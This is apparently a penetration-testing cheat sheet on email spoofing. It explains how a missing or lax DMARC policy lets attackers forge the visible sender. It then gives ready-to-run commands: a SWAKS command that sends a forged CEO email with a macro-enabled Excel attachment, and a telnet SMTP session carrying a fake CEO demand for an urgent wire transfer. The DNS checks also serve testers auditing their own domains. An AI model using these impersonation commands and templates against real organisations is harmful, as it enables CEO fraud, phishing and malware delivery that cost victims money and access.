# Email
Often email servers are misconfigured and make it easy to impersonate company emails which opens alot of attack vectors.

## Tools
- nslookup: Lookup records such as mx, dmarc, spf, ect.
- dig: Same as nslookup but sometimes nslookup might not report all the records.
- [mxtoolbox](https://mxtoolbox.com/SuperTool.aspx): Online version of nslookup with a nice interface.
- [Can I Be Spoofed](https://github.com/Rices/CanIBeSpoofed): Automatically scan for a ton of email exploits.
- [SWAKS](https://github.com/jetmore/swaks): Tool for working with SMTP and can automate a lot of the exploits.

## DMARC
If DMARC isn't configured there is no way to verify the alignment between `MAIL FROM` and `FROM` fields. Since 99% of receiving users only see `FROM` then an attacker is free to forge anything.

This attack is also called "SPF-BYPASS"

You can check on [mxtoolbox](https://mxtoolbox.com/SuperTool.aspx) using the DMARC tool or run one of the following:

```shell
nslookup _dmarc.target.com txt
dig _dmarc.target.com txt
```

> If it is set check if `p=None` is set. `p=none` means DMARC policy of reject or quarantine isn't enforced.

1. Buy a domain or configure a subdomain.
2. Get a VPS that allows SMTP like DigitalOcean.
3. Set the right SPF record on the domain. For example `v=spf1 mx a ip4:<Digital OCEAN IP> -all`
4. Using [SWAKS](https://github.com/jetmore/swaks): `./swaks --ehlo mydomain.com(step1) --from attacker@mail.mydomain.com --to victim@orgname.com --server orgname-com.mail.protection.outlook.com --h-From '"CEO  ORG" <ceo@orgname.com>' --attach-type text/html --attach-body @Mail-Template.html --attach macroexcel.xlsm --attach-type text/html` or whatever payloads you want to send.

### Manual
Instead of using [SWAKS](https://github.com/jetmore/swaks) you can manually do the same stuff with `telnet`.

```shell
telnet orgname-com.mail.protection.outlook.com 25
```

```shell
ehlo mydomain.com
MAIL FROM: attacker@mydomain.com
RCPT To: victim@orgname.com
data
from: "CEO ORG" <ceo@orgname.com>
to: <victim@orgname.com
subject: transfer money urgently!!

Need you to wire transfer to account 123456789. Get this done ASAP!
```
